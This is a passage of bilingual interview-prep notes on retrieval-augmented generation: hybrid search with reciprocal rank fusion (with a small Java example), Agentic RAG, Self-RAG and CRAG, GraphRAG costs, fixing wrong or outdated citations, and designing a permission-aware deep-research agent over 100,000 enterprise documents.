**现有笔记：** [06 §2.2](06-ai-system-design.md#s2-2) 的环节表 + [端到端流水线](06-ai-system-design.md#h8)；[长上下文 vs RAG](06-ai-system-design.md#h14) 对比表；[06 §2.11](06-ai-system-design.md#s2-11) 讲 prompting / RAG / 微调（fine-tuning）怎么选；[06 §5.3](06-ai-system-design.md#s5-3) 是一个手工推演的政策问答完整案例；[03 GenAI 系统架构与 RAG](notes/03-genai-system-architecture.md) 有入门版两条流水线（pipeline）。

**答案要点**
1. **RAG（retrieval-augmented generation，检索增强生成）**：先从文档里搜出相关段落（passage），再让模型根据这些段落回答。分两条流水线：
   - **离线索引（indexing）**：解析（parsing）→ 切块（chunking：把长文档切成小段）→ 向量化（embedding：把文字变成一串数字，意思相近的数字也相近）→ 写入向量索引（vector index）和关键词索引，每块带元数据（metadata，标题、版本、权限（permission））。
   - **在线查询**：改写问题 → 混合检索（hybrid retrieval：关键词 + 向量两路一起搜，见 Q33）+ 权限过滤 → 重排（reranking：用更准但更慢的模型给候选重新排序）→ 取前几段拼进 prompt → 生成带引用（citation）的答案 → 校验（validation）引用。
2. **为什么不微调（fine-tuning：用自己的数据继续训练模型）**：微调适合改"行为和格式"，不适合灌"会变的事实"。知识每天更新就得反复训练（training）；模型说不出答案出自哪份文档；也做不到"这个员工没权限看这份文档"。
3. **为什么不全塞上下文（context）**：Anthropic 的经验线是知识库（knowledge base）小于约 20 万 token（约 500 页）可以直接放进 prompt 并用提示缓存（prompt caching：开头相同的部分复用计算，降本降延迟）。超过这个量、经常变、或者要按人过滤权限时，就需要检索（retrieval）。长上下文（long context）中间部分的信息利用也会变差（"Lost in the Middle"），要用自己的评测（evaluation, eval）验证。
4. **Agent 场景的特殊点**：Agent 要**按需多次检索**（Agentic RAG，见 Q34），所以检索要做成一个工具，返回块 ID、命中总数、是否截断（truncation）；检索结果是**不可信输入**（可能含间接提示注入（prompt injection）），不能当指令执行。
5. **记住一句话**：RAG 管"知道什么"（可更新、可引用、可控权限），微调管"怎么做"，长上下文是 RAG 的补充（检索到文档级再整篇放进去）。

**English answer (speakable, ~45–75 s):**
> RAG has two pipelines. Offline, I parse documents, chunk them by structure, embed them, and index both vectors and keywords, with each chunk carrying metadata like version and access control. Online, I rewrite the question, run hybrid retrieval filtered by the user's permissions, rerank, put the top passages in the prompt, and generate an answer with citations that I then verify.
> Why not fine-tune? Fine-tuning is good for behavior and format, but it's a poor way to store facts that change: you'd retrain constantly, you can't cite a source, and you can't enforce who's allowed to see what. Why not long context? If the corpus is small and stable — Anthropic's rule of thumb is under about 200k tokens — I'd just put it in the prompt and cache it. Beyond that, or when it changes or is permissioned, I need retrieval anyway. For agents specifically, retrieval becomes a tool the agent can call several times, and whatever comes back is untrusted data, not instructions.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 有了 RAG 为什么还会幻觉？ | 三层原因：没召回（模型根本没看到证据）；召回了但被噪声淹没或放在中间；证据不足时模型不弃答。分开测检索层和生成层（06 §2.2 逐层排查表） | Three layers: the evidence wasn't retrieved, it was retrieved but buried in noise, or the evidence was insufficient and the model answered anyway instead of abstaining. I measure retrieval and generation separately. |
| 什么时候 RAG 和微调一起用？ | 领域术语多、检索 query 和文档用词差异大时，可以微调 embedding 或 reranker；生成模型微调用于固定输出格式。知识本身仍走 RAG | When domain vocabulary is unusual, fine-tuning the embedding model or reranker helps retrieval, and fine-tuning the generator can lock in output format. The facts themselves still come from retrieval. |

**坑**
- 说"上下文已经百万 token 了，RAG 过时了"。权限、更新、成本、可引用性这四点长上下文都解决不了。
- 把"20 万 token"说成硬阈值（threshold）。这是 Anthropic 给的经验线，要按成本和自己的评测定。
- 只讲在线流程，不讲离线索引的版本、增量更新和删除。

**来源：** [Anthropic：Introducing Contextual Retrieval（含 200k token 经验线）](https://www.anthropic.com/news/contextual-retrieval)、[Lost in the Middle: How Language Models Use Long Contexts（arXiv 2307.03172）](https://arxiv.org/abs/2307.03172)

---

### Q33 · 为什么要做混合检索？BM25 和向量检索的结果怎么融合？RRF 的原理和参数怎么定？ <a id="q33"></a> [↑ 目录](#toc)

**English question:** Why use hybrid search? How do you fuse BM25 and vector search results, and how does reciprocal rank fusion work and get tuned?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.2 机制补充](06-ai-system-design.md#h7) 已用例子讲了 BM25 和向量（vector）各自强在哪、RRF 公式、bi-encoder 和 cross-encoder 的分工；[06c Q1](06c-ai-sd-question-bank.md) 用在企业知识库里。本题补 RRF 的算例、参数和替代方案。

**答案要点**
1. **为什么混合**：
   - **BM25（关键词检索）**：按词频和稀有度打分。强在精确匹配：错误码 `ERR_PAY_1042`、产品型号、人名、项目代号。弱在同义改写（"住宿"搜不到"酒店费用"）。
   - **向量检索（dense retrieval）**：按语义相似度。强在同义和意译，弱在精确标识符，还可能把"相似但不同"的错误码当成一个。
   - 两路漏的东西不一样，合起来召回（recall）更高。Anthropic 的 Contextual Retrieval 实验里，在 embedding 基础上加 BM25 让 top-20 检索失败率继续下降（见 Q36 的数字）。
2. **为什么不能直接把分数相加**：BM25 分数没有上限、分布随查询变；余弦相似度在 -1 到 1 之间。量纲不同，直接相加等于随便加权。
3. **RRF（reciprocal rank fusion，倒数排名融合）**：只看名次不看分数。文档 d 的融合分 = Σ 1 / (k + rank)，对每一路结果求和，rank 从 1 开始。Cormack 等 2009 年提出，常数 k 取 60；Elasticsearch 的 `rank_constant` 默认也是 60。
   - 算例（k = 60）：文档 A 在 BM25 排第 1、向量排第 3 → 1/61 + 1/63 ≈ 0.0164 + 0.0159 = 0.0323；文档 B 只在向量里排第 2 → 1/62 ≈ 0.0161。**两路都出现的文档会被明显抬高**。
   - k 的作用：k 越大，第 1 名和第 10 名的差距越小（更"民主"）；k 越小，越看重头部名次。
4. **参数怎么定**：k、每路取多少候选（`rank_window_size`）、要不要给某一路加权，**都用自己的标注（labeling）集调**，看 recall@k 和最终答案质量。不要背"60 就是最优"。
5. **替代方案**：分数归一化（min-max 或 z-score）后加权求和，可以调权重，但要处理每个查询的分布差异；或者两路各取前 N 合并去重（deduplication）后，统一交给 cross-encoder 重排，此时融合方式影响变小，因为最终排序由重排器决定。**重排只能调整已有候选，救不回没召回的证据**，所以融合阶段的候选窗口要够大。

```java
// Reciprocal rank fusion over any number of ranked lists
Map<String, Double> reciprocalRankFusion(List<List<String>> rankedLists, int rankConstant)
{
    Map<String, Double> scoreMap = new HashMap<>();
    for (List<String> rankedList : rankedLists)
    {
        for (int rank = 1; rank <= rankedList.size(); rank++)
        {
            String chunkId = rankedList.get(rank - 1);
            scoreMap.merge(chunkId, 1.0 / (rankConstant + rank), Double::sum);
        }
    }
    return scoreMap; // sort by value descending, then send top candidates to the reranker
}
```

**English answer (speakable, ~45–75 s):**
> Keyword search and vector search fail on different queries. BM25 nails exact identifiers — error codes, product names, people — but misses paraphrases. Vectors handle paraphrase but are weak on exact tokens and can blur two similar error codes together. So I run both and fuse.
> I can't just add the scores: BM25 is unbounded and query-dependent, cosine is between minus one and one. The simple robust option is reciprocal rank fusion: each document gets the sum of one over k plus its rank in each list, with k around 60 as in the original paper and Elasticsearch's default. It only uses ranks, so there's no calibration, and documents that show up in both lists rise to the top.
> I treat k, the candidate window and any per-list weight as hyperparameters tuned on a labeled set. And in practice I fuse a generous candidate pool and let a cross-encoder reranker make the final order — because a reranker can reorder candidates, but it can't recover something neither retriever found.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 什么情况下 RRF 不好用？ | 一路质量明显差时，RRF 默认等权会把噪声拉进来；这时加权 RRF 或只在高置信时用那一路。另外 RRF 丢掉了"分数差距"信息：第 1 名远远领先和险胜得分一样 | When one retriever is clearly worse, equal-weight RRF drags its noise in, so I'd weight it down. RRF also throws away score margins: a runaway first place and a narrow one look the same. |
| 稀疏向量（SPLADE 这类学习型稀疏检索）能替代 BM25 吗？ | 可以作为第三路或替代 BM25，能学到同义扩展；代价是要训练 / 选模型、索引更大。精确标识符场景 BM25 依然便宜可靠 | Learned sparse retrieval can be a third list or replace BM25, since it learns term expansion. But it costs a model and a bigger index, and for exact identifiers BM25 is still cheap and reliable. |

**坑**
- 把 BM25 分数和余弦分数直接相加。
- 说"RRF 的 k 必须是 60"。60 是论文和 Elasticsearch 的默认值，不是普适最优。
- 以为 rerank 能弥补召回不足。融合阶段候选太少，重排再好也没用。

**来源：** [Cormack, Clarke, Büttcher：Reciprocal Rank Fusion outperforms Condorcet and individual Rank Learning Methods（SIGIR 2009）](https://plg.uwaterloo.ca/~gvcormac/cormacksigir09-rrf.pdf)、[Elasticsearch 文档：Reciprocal rank fusion](https://www.elastic.co/docs/reference/elasticsearch/rest-apis/reciprocal-rank-fusion)、[Anthropic：Introducing Contextual Retrieval](https://www.anthropic.com/news/contextual-retrieval)

---

### Q34 · Agentic RAG 和传统 RAG 有什么区别？Self-RAG、CRAG 分别做了什么？ <a id="q34"></a> [↑ 目录](#toc)

**English question:** How does agentic RAG differ from traditional RAG, and what do Self-RAG and CRAG each contribute?
（难度：核心 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.2 Agentic RAG](06-ai-system-design.md#h12) 已有 pipeline vs agentic 对比表和"默认 pipeline + 充分性检查"的取舍；本题补 Self-RAG / CRAG 的具体机制。

**答案要点**
1. **区别在"谁决定检索"**：
   - **传统 RAG（pipeline RAG）**：代码决定。每个请求固定检索一次，拿到什么就用什么。可预测、便宜，适合单跳问题（single-hop：查一次就能答）。
   - **Agentic RAG**：模型决定要不要查、用什么 query、查哪个数据源、够不够、何时停。检索是模型可以反复调用的工具。适合多跳问题（multi-hop：先查到 A，再根据 A 查 B）、模糊问题、多数据源。代价是延迟（latency）和成本不可预测，评测要看整条轨迹（trajectory）。
2. **Self-RAG**（Asai 等，2023-10，7B / 13B 模型）：训练模型自己输出**反思 token（reflection tokens）**：
   - Retrieve：这一段要不要检索。
   - ISREL：检索到的段落和问题相关吗。
   - ISSUP：生成的话有没有被段落支持。
   - ISUSE：整体回答有没有用。
   - 训练方式：先训一个评审模型（critic），用它离线给训练数据插入反思 token；再用这些数据按普通下一个 token 预测训练生成模型。推理（inference）时可以按这些 token 的概率做筛选和排序。**要点是"按需检索 + 自我评审"内化进模型**，需要训练。
3. **CRAG（Corrective RAG，纠错式 RAG）**（Yan 等，2024-01）：不改生成模型，**在检索后加一个轻量评估器**（基于 T5-large，约 0.77B 参数）给每个文档打 -1 到 1 的相关分：
   - Correct（至少一篇高于上阈值）：把内部文档精炼成"知识条"（decompose-then-recompose：拆成小段、去掉无关内容、再拼回来）后使用。
   - Incorrect（全部低于下阈值）：丢掉检索结果，改用网页搜索。
   - Ambiguous（介于两者）：内部精炼结果 + 网页搜索结果一起用。
   - **要点是即插即用**，可以套在任何 RAG 上。
4. **工程落地**：生产上很少直接用 Self-RAG 的训练版，更常见的是把两者的思想做成流程：检索后加"相关性 / 充分性检查"（可以是小模型（small model）或 LLM 判断），不够就改写 query、换数据源或弃答（abstention）；生成后做"引用是否支持"校验。这就是 Agentic RAG 的最小版本。
5. **我的默认**：先 pipeline + 一次充分性检查；多跳问题占比高时才升级到 agent 循环（loop），并设步数上限和预算（budget）。

**English answer (speakable, ~45–75 s):**
> The difference is who decides to retrieve. In a classic pipeline, code retrieves once per request and the model uses whatever comes back — cheap and predictable, fine for single-hop questions. In agentic RAG, retrieval is a tool: the model decides whether to search, what query to use, which source, and when it has enough. That handles multi-hop and vague questions, but cost and latency become variable, so you need step limits and trajectory-level eval.
> Self-RAG and CRAG are two ways to add judgment around retrieval. Self-RAG trains the model itself to emit reflection tokens — should I retrieve, is this passage relevant, is my sentence supported, is the answer useful. CRAG leaves the generator alone and adds a small retrieval evaluator: if the documents look right, it refines them; if they look wrong, it falls back to web search; if it's unsure, it uses both. In production I usually borrow the idea rather than the model: a relevance and sufficiency check after retrieval, a citation-support check after generation, and a capped loop.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 企业内网能照搬 CRAG 的网页搜索兜底吗？ | 通常不能。内部问题去公网搜会泄露信息、拿到无关结果。兜底应换成"换内部数据源 / 改写 query / 弃答并转人工" | Usually not. Sending internal questions to public web search leaks information and returns irrelevant results. The fallback should be another internal source, a rewritten query, or an explicit "I don't know" with escalation. |
| Agentic RAG 怎么防止无限检索？ | 步数上限 + token 预算 + "连续两轮没有新证据就停"；每次检索记录 query 和新增块数，重复 query 直接拦截 | A step cap, a token budget, and a stop rule like "two rounds with no new evidence". I log each query and how many new chunks it added, and block exact repeats. |

**坑**
- 说"Agentic RAG 一定比传统 RAG 好"。单跳问题上它只是更慢更贵。
- 把 Self-RAG 当成一个 prompt 技巧。它要训练评审模型和生成模型。
- 把 CRAG 的评估器说成大模型。论文用的是约 0.77B 的 T5-large 微调版本，阈值按数据集调。

**来源：** [Self-RAG（arXiv 2310.11511）](https://arxiv.org/abs/2310.11511)、[Self-RAG 项目页](https://selfrag.github.io/)、[CRAG: Corrective Retrieval Augmented Generation（arXiv 2401.15884）](https://arxiv.org/abs/2401.15884)、[CRAG 论文 HTML 版（评估器与阈值）](https://arxiv.org/html/2401.15884)

---

### Q35 · GraphRAG 和普通向量 RAG 各适合什么问题？GraphRAG 的成本问题怎么解决？ <a id="q35"></a> [↑ 目录](#toc)

**English question:** What kinds of questions suit GraphRAG versus plain vector RAG, and how do you deal with GraphRAG's cost?
（难度：进阶 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.2 GraphRAG：什么时候值得](06-ai-system-design.md#h13) 已有做法、值得 / 不值得对照表和"关系已结构化就直接查图"的轻量替代；本题补论文数字和 LazyGraphRAG。

**答案要点**
1. **Microsoft GraphRAG 怎么做**（Edge 等，2024-04）：
   - 索引期：LLM 从每个文本块抽实体（entity）和关系 → 建知识图 → 社区检测（community detection：找出联系紧密的一群节点），分层 → 给每个社区预先生成摘要（summary）。
   - 查询期：**local search**（从实体邻域找答案）；**global search**（每个社区摘要各出一个部分答案，再汇总成最终答案，即 map-reduce）。
2. **各适合什么**：
   - 向量 RAG：事实查找（"差旅住宿上限多少"），答案在一两段里。
   - GraphRAG global：**全局概括问题**（"这 1000 份事故报告的主要主题是什么"），答案分散在整个语料（corpus）里，top-k 检索结构上答不了。论文在约 100 万 token 的数据集上，global 方法对向量 RAG 的全面性（comprehensiveness）胜率 72–83%（播客）/ 72–80%（新闻），多样性（diversity）胜率 75–82% / 62–71%。
   - GraphRAG local：实体关系强的多跳问题。
3. **成本问题**：索引期每个文本块都要调 LLM 抽取（extraction），社区摘要也要 LLM 生成，语料一变就要重建；抽错的关系会固化进图。论文里"根层级社区摘要比直接对原文做 map-reduce 少用 97% 以上 token"，**比较对象是原文 map-reduce，不是向量 RAG**。
4. **怎么降成本**：
   - **LazyGraphRAG**（Microsoft Research，2024-11）：索引期不用 LLM，只用 NLP 名词短语抽取 + 共现关系 + 图统计建社区层级；LLM 全部推迟到查询时（拆子问题、从相关块里抽观点）。官方数字：索引成本和向量 RAG 相同，是完整 GraphRAG 的 0.1%；达到与 GraphRAG global search 相当的质量时，查询成本低 700 多倍。
   - 关系本来就在系统里（CMDB、组织架构、服务依赖）：直接把图当工具查，不用 LLM 抽取。
   - 只对稳定子语料建图；频繁变化的部分走向量 RAG。
5. **我的取舍**：默认混合检索 + 重排；只有"全局概括"问题占比高、语料相对稳定、能评估抽取质量时才上 GraphRAG，并优先试 LazyGraphRAG 这类延迟索引的方案。

**English answer (speakable, ~45–75 s):**
> Vector RAG is for point lookups — the answer sits in one or two passages. GraphRAG is for questions whose answer is spread across the whole corpus, like "what are the main themes across these thousand incident reports." Top-k retrieval structurally can't answer that. GraphRAG extracts entities and relations with an LLM, clusters them into communities, pre-summarizes each community, and answers global questions by map-reducing over those summaries. In Microsoft's paper, that beat vector RAG on comprehensiveness and diversity for global questions.
> The catch is indexing cost: an LLM call per chunk plus community summaries, and you rebuild when the corpus changes. Two ways around it. If the relationships already live in a system of record, query that graph as a tool. Otherwise, something like LazyGraphRAG defers all LLM work to query time — Microsoft reports indexing cost equal to vector RAG and about a tenth of a percent of full GraphRAG. I'd only reach for any of this when global questions are a real share of traffic.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 怎么判断抽出来的图质量好不好？ | 抽样人工标注实体和关系的准确率；看实体消歧（同一个人不同写法有没有合并）；最终还是用端到端问答评测比较 GraphRAG 和混合检索 | Sample and label entity and relation accuracy, check entity resolution — whether name variants got merged — and ultimately compare end-to-end answer quality against hybrid retrieval on the same eval set. |
| 语料每天更新，GraphRAG 还能用吗？ | 完整 GraphRAG 的社区摘要会过时，增量更新成本高；LazyGraphRAG 索引便宜，更适合；或者只对低频更新的子集建图 | Full GraphRAG's community summaries go stale and incremental rebuilds are expensive. A lazy approach with cheap indexing fits better, or build the graph only over the slow-changing subset. |

**坑**
- 把"97% 更少 token"说成比向量 RAG 省。它比较的是对原文做 map-reduce。
- 把任何有图的系统都叫 GraphRAG。人工定义的依赖图、知识图谱（knowledge graph）查询不是 GraphRAG。
- 不提评测：GraphRAG 论文用 LLM 当裁判做两两比较，胜率是相对指标，不是准确率。

**来源：** [From Local to Global: A GraphRAG Approach to Query-Focused Summarization（arXiv 2404.16130）](https://arxiv.org/abs/2404.16130)、[GraphRAG 论文 HTML 版 v2（胜率与 token 表）](https://arxiv.org/html/2404.16130v2)、[Microsoft Research：LazyGraphRAG](https://www.microsoft.com/en-us/research/blog/lazygraphrag-setting-a-new-standard-for-quality-and-cost/)

---

### Q36 · 你的知识库问答 Agent 线上召回看着还行，但答案经常引用错误或过期的段落、引用和结论对不上，怎么排查和修复？ <a id="q36"></a> [↑ 目录](#toc)

**English question:** Your knowledge-base QA agent shows decent retrieval recall in production, but answers often cite the wrong or outdated passages, or the citations don't support the claims. How do you debug and fix it?
（难度：实战 · 题目后半句按截断前文补全）

**现有笔记：** [06 §2.2 失败模式：逐层排查](06-ai-system-design.md#h16) 有从数据往上查的表；[06 §2.2 RAG eval](06-ai-system-design.md#h15) 讲 faithfulness 等指标；[06 §5.3 F 故意让它失败](06-ai-system-design.md#h61) 有旧政策混入当前答案的推演；[06c Q1](06c-ai-sd-question-bank.md) 有两步引用校验。

**答案要点**
1. **先止血（mitigation）**：
   - 上线引用校验门禁：答案里引用的块 ID 必须在本次检索结果里（纯代码比对）；校验失败就降级（graceful degradation）成"只给相关文档链接，不给结论"或弃答。
   - 过期文档立刻在检索时过滤掉（`status = current`、`effectiveTo` 已过的不进候选）。
2. **定位：把"召回还行"拆开看**：
   - recall@20 高不代表进 prompt 的前 5 段对。看**进入 prompt 的段落**里正确段落的排名和占比。
   - 按失败样本分类：A 证据没进 prompt（检索 / 重排问题）；B 证据在 prompt 里但模型引用了别的（生成问题）；C 证据过期或版本冲突（conflict，索引问题）；D 证据本身不够，模型硬答（弃答问题）。
   - **oracle 测试**：直接把正确段落给模型，如果答对了，问题在检索；还答错，问题在生成。
3. **常见根因（root cause）**：
   - 新旧版本同时在索引里，旧版本措辞更接近问题，排到前面（版本元数据缺失）。
   - 块脱离上下文：段落里写"上限 800 元"但看不出是哪份政策、哪个城市类别，模型张冠李戴。
   - 塞进 prompt 的段落太多，正确段落在中间被忽略（"Lost in the Middle"）。
   - 证据不足时不弃答：Google 的 "Sufficient Context" 研究发现，强模型在上下文不充分时常常给出错误答案而不是弃答。
   - 引用是"事后编"的：模型先写答案再随便挂一个 ID。
4. **修复**：
   - 索引：每块带 `docVersion / effectiveFrom / effectiveTo / supersededBy`，默认只检索当前版本；给块加上下文标题（标题 > 章节 > 版本），或用 Anthropic Contextual Retrieval 让模型为每块写一段说明。Anthropic 报告（他们自己的数据集，top-20 检索失败率）：基线（baseline） 5.7% → 上下文 embedding 3.7%（降 35%）→ 再加上下文 BM25 2.9%（降 49%）→ 再加重排 1.9%（降 67%）；用提示缓存后一次性成本约每百万文档 token 1.02 美元。
   - 检索：减少进 prompt 的段落数，靠重排保质量；按版本 / 生效日期去重。
   - 生成：要求"每句结论后紧跟引用"，用结构化输出（每个 claim 带 `chunkIds`）；或用厂商（vendor）的引用功能（如 Anthropic Citations：文档按句切分，模型返回被引用的原文片段，被引用文本不计输出 token）。
   - 校验：第二步用小的蕴含（entailment）判断模型（NLI：判断"这段话能不能推出这句结论"）逐句检查引用是否支持；加充分性检查，不够就弃答。
5. **上线指标**：引用存在率（应接近 100%）、引用支持率（NLI 或人工抽检）、过期引用率、弃答率与"该弃答却答了"的比例；按问题类型分开看，变更前后用同一评测集（eval set）对比。

**English answer (speakable, ~45–75 s):**
> First, stop the bleeding: a hard check that every cited chunk ID was actually in this request's retrieval results, with a fallback to "here are the relevant documents" when it fails, and an immediate filter that drops expired versions from candidates.
> Then I'd break down "recall looks fine." Recall at 20 doesn't tell me what made it into the prompt. I'd bucket failures: the right passage never reached the prompt; it was there but the model cited something else; the passage was outdated; or the evidence wasn't sufficient and the model answered anyway. An oracle test — hand the model the right passage — separates retrieval from generation.
> Typical root causes are old and new versions both indexed, chunks that lost their context, too many passages in the prompt, and no abstention. Fixes: version metadata with current-only retrieval, contextual chunk headers, fewer but reranked passages, claim-level citations in structured output, and an entailment check per claim. I'd track citation-support rate and stale-citation rate as release metrics.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| NLI 校验太慢怎么办？ | 只校验带数字、金额、日期、政策条款的句子；用小模型并行跑；高风险类问题全校验，低风险抽样 | Only verify claims with numbers, dates or policy terms, run a small model in parallel, verify everything on high-risk question types and sample the rest. |
| 用户就是问旧政策怎么办？ | 问题里有历史时间点时，检索过滤改成 `effectiveFrom <= t < effectiveTo`；答案里明确写"这是 X 年的版本，现行版本是……" | If the question names a past date, filter on the version effective at that date, and say explicitly in the answer which version it is and what the current one says. |

**坑**
- 看 recall@20 就说检索没问题，不看进 prompt 的段落和排名。
- 只在 prompt 里写"请准确引用"，没有代码层的引用存在性校验。
- 把 Anthropic 的 35% / 49% / 67% 当普适提升。那是他们的数据集上的相对降幅，要用自己的数据测。

**来源：** [Anthropic：Introducing Contextual Retrieval](https://www.anthropic.com/news/contextual-retrieval)、[Sufficient Context: A New Lens on Retrieval Augmented Generation Systems（arXiv 2411.06037）](https://arxiv.org/abs/2411.06037)、[Lost in the Middle（arXiv 2307.03172）](https://arxiv.org/abs/2307.03172)、[Claude 博客：Introducing Citations on the Anthropic API](https://claude.com/blog/introducing-citations-api)

---

### Q37 · 设计一个面向企业内部 10 万份文档、每天都有更新的深度研究（deep research）问答 Agent <a id="q37"></a> [↑ 目录](#toc)

**English question:** Design a deep-research Q&A agent over an enterprise's 100,000 internal documents that are updated every day.
（难度：实战 · 系统设计 · 题目后半句按截断前文补全）

**现有笔记：** [06c Q1](06c-ai-sd-question-bank.md) 是带权限企业 RAG 的完整设计（ACL 同步、泄露测试集）；[06 §2.2 端到端流水线](06-ai-system-design.md#h8)、[向量索引基础](06-ai-system-design.md#h9)、[Agentic RAG](06-ai-system-design.md#h12)；[06 §2.4](06-ai-system-design.md#s2-4) 讲长任务状态外化（state externalization）。本题在 Q1 基础上加"深度研究"多步循环和增量索引（incremental indexing）细节。

**答案要点**

**1. 澄清（先问再画）**：多少用户、并发（concurrency）多少；文档来源（wiki、云盘、工单、代码库）；权限模型（文档级还是段落级，是否继承用户组）；"每天更新"是多少比例、改了多久必须生效、权限撤销多久必须生效；"深度研究"的产出是一段答案还是一份带引用的报告，能等多久（几十秒还是几分钟）。

**2. 规模估算（estimation，全部为推算，假设写明）**
| 项 | 假设 | 推算 |
|---|---|---|
| 语料 | 10 万份 × 平均 5,000 token | 5 亿 token（推算：1e5 × 5e3） |
| 块数 | 每块约 500 token、10% 重叠 | 约 110 万块（推算：5e8 ÷ 450） |
| 向量存储 | 1024 维 float32 = 4 KB / 块 | 约 4.4 GB 原始向量（推算：1.1e6 × 4 KB）；int8 量化约 1.1 GB；单机内存装得下，不需要分布式向量库（vector database） |
| 每日变更 | 假设 2% 文档变动 = 2,000 份 | 约 1,000 万 token、约 2.2 万块需要重新处理（推算） |
| 上下文说明成本 | 按 Anthropic 给的每百万文档 token 约 1.02 美元 | 首次全量约 510 美元（推算：500 × 1.02），每日增量约 10 美元（推算：10 × 1.02）；这是 2024 年的价格假设，要按当前模型价格重算 |
| 在线量 | 假设 1 万员工、每天 5% 发起研究任务、每任务约 20 次检索 | 约 500 任务 / 天、约 1 万次检索 / 天（推算），检索 QPS 很低，**成本大头是 LLM token，不是检索** |

**3. 组件**
- **连接器（connector）层**：每个来源一个连接器，优先用 webhook / CDC（change data capture：来源一改就推送变更事件）；不支持的定期拉列表，比对 `lastModified` 和内容哈希（hash）。
- **摄取队列（queue） + 解析 / 切块 worker**：按文档结构切块，表格保留列名，每块带上下文标题；可选 Contextual Retrieval。
- **索引层**：向量索引（HNSW 这类近似最近邻索引）+ 关键词索引（BM25）+ 元数据（`docId, version, effectiveFrom/To, allowedPrincipals, sourceUrl, contentHash`）。
- **权限同步（sync）服务**：监听用户组变化，只更新块的 ACL 元数据，不重新向量化。
- **检索服务**：混合检索 + 权限预过滤 + RRF 融合 + cross-encoder 重排，暴露成工具 `searchDocs(query, filters, topK)`，返回块 ID、命中总数、是否截断。
- **研究编排器（orchestrator，代码）**：状态机（state machine）控制"计划 → 并行（parallel）检索 → 阅读 → 记笔记 → 充分性检查 → 再查或成文"；步数、token、时间三重预算；状态（计划、已读文档、笔记）存数据库（database），崩溃后可续跑。这个"主 agent 规划（planning） + 并行子 agent 检索"的结构和 Anthropic 公开的多智能体（multi-agent）研究系统一致（多智能体部分见 Q44、Q72）。
- **LLM 角色**：规划器（planner，推理模型，拆子问题）、阅读器 / 子 agent（小模型，读整篇文档提炼带引用的笔记）、撰写器（汇总成报告）、引用校验器（NLI 小模型）。
- **观测（observability）与评测**：每次任务留 trace（子问题、检索 query、命中块、引用），抽样进评测集。

**4. 数据流**
- **写路径**：来源变更 → 事件进队列 → 拉取新版本 → 按章节计算内容哈希，**只重新切块 / 向量化哈希变化的章节** → 新块写入，旧版本块标记 `effectiveTo = now`（或硬删除，按合规要求）→ 发布"索引已更新"事件。删除事件走墓碑（tombstone：先标记删除，检索立刻过滤），在 SLA 内从向量索引物理删除。
- **读路径**：用户提问 → 鉴权（authorization），展开用户组（缓存（cache）几分钟）→ 规划器拆成 3–6 个子问题 → 子 agent 并行检索（每次都带用户身份过滤）→ 先在块级召回，再把命中文档整篇（或相关章节）读进长上下文 → 每个子 agent 交回"结论 + 引用块 ID"的笔记 → 编排器做充分性检查，缺口再派一轮 → 撰写器成文 → 引用校验（ID 存在 + 蕴含支持）→ 返回带可点击引用的报告。

**5. 新鲜度（freshness）**
- 目标举例：内容改动 p95 15 分钟内可检索，权限撤销 5 分钟内生效（这是设计目标，按业务定，不是行业数字）。
- 监控（monitoring）"索引延迟" = 现在 − 最老未处理变更事件的时间；超阈值告警（alerting）。
- **换 embedding 模型 = 全量重建**：建影子索引（shadow index）、双写、回填、在评测集上对比、切别名（alias）上线，旧索引保留可回滚（rollback）。

**6. 权限感知检索（ACL-aware retrieval）**
- **检索时预过滤**（pre-filter：先按 `allowedPrincipals ∩ userGroups` 过滤再做向量搜索），绝不在生成后再过滤，因为模型已经"看到"了。
- 子 agent 和工具调用（tool call）一律用**发起用户的身份**，不用高权限服务账号；任何缓存（检索缓存、笔记、报告）的 key 都包含用户权限指纹，防止 A 的研究结果被 B 复用。
- 纵深防御（defense in depth）：最终引用的文档在返回前再向来源系统实时校验一次权限（只校验被引用的几十份，成本可控）。
- 发布门禁：权限泄露测试集（test set，低权限身份问高权限内容），期望泄露数 = 0。

**7. 关键取舍**
- 块级召回 + 文档级阅读：块检索准，整篇阅读保上下文；代价是 token 多，所以阅读交给小模型子 agent，主 agent 只看笔记。
- 深度 vs 延迟：深度研究给预算和进度流式（streaming）展示（"已查 12 份文档"），而不是追求几秒出结果；简单事实问题路由（routing）到普通 RAG。
- 硬删除 vs 版本保留：合规要求删除的必须物理删；政策类保留历史版本以回答"去年的规定"。

**English answer (speakable, ~45–75 s):**
> I'd start with the numbers. A hundred thousand documents at a few thousand tokens each is roughly half a billion tokens, about a million chunks — that's a few gigabytes of vectors, so a single well-provisioned vector index is fine. Retrieval QPS is low; the real cost is LLM tokens in the research loop.
> Ingestion is event-driven: connectors push changes through a queue, I hash content per section and only re-embed sections that changed, and old versions get an expiry timestamp so retrieval defaults to current content. Deletes are tombstoned immediately. ACL changes only update chunk metadata, no re-embedding. An embedding model change means a shadow index and an alias switch.
> The research loop is code-orchestrated: a planner splits the question into sub-questions, sub-agents retrieve in parallel with hybrid search, permission pre-filtering and reranking, read whole documents, and return notes with chunk IDs. The orchestrator checks sufficiency, loops within a budget, then a writer composes the report and a verifier checks every citation. Every sub-agent runs as the requesting user, caches are keyed by permissions, and a zero-leak test set gates releases.

**追问**
| 追问 | 中文要点 | English |
|---|---|---|
| 用户组很大（一个人属于几百个组），预过滤会不会慢？ | 把组展开结果缓存；索引按部门 / 租户分区先缩小范围；向量库要支持过滤感知的 ANN，不然过滤后结果太少会召回不足 | Cache the group expansion, partition the index by department or tenant first, and use a vector store with filter-aware ANN — otherwise a restrictive filter applied after the ANN search leaves too few results. |
| 两个子 agent 查到互相矛盾的文档怎么办？ | 比较版本和生效日期、来源权威性；无法判断时在报告里并列写出两种说法和出处，不替用户拍板 | Compare versions, effective dates and source authority. If it's still unresolved, the report states both positions with their sources rather than picking one silently. |

**坑**
- 只画在线检索，不讲增量索引、删除和换模型重建。
- 子 agent 用服务账号检索，权限在最后才过滤，或者缓存不带权限维度。
- 规模估算说"要上分布式向量库"：100 万量级块，单机索引就够，复杂度应该花在新鲜度和权限上。

